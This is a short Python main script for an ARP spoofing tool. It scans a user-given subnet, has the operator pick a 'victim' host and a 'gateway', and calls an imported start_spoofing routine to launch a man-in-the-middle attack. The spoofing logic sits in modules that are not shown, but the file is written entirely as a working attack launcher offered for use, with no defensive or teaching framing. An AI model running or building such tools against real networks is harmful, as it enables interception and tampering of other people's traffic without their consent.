from setup.network_scan import scan_network
from attacks.arp_spoof import start_spoofing
import sys

def choose_host(hosts, role = "victim"):
    print(f"\nSelect a {role}:")
    for i, (ip, mac) in enumerate(hosts):
        print(f"{i}: {ip} ({mac})")
    idx = input(f"Enter number [0-{len(hosts)-1}]: ")
    return hosts[int(idx)]

def main():
    print("=== ARP Spoofing Tool ===")
    iface = input("Interface (leave blank for default): ").strip() or None
    subnet = input("IP range to scan (e.g. 192.168.1.0/24): ").strip()

    hosts = scan_network(subnet, iface=iface)

    if len(hosts) < 2:
        print("Error : Not enough devices found.")
        sys.exit(1)

    victim_ip, victim_mac = choose_host(hosts, "victim")
    gateway_ip, gateway_mac = choose_host(hosts, "gateway")

    print(f"\nLaunching ARP spoofing...")
    start_spoofing(victim_ip, victim_mac, gateway_ip, gateway_mac)

if __name__ == "__main__":
    main()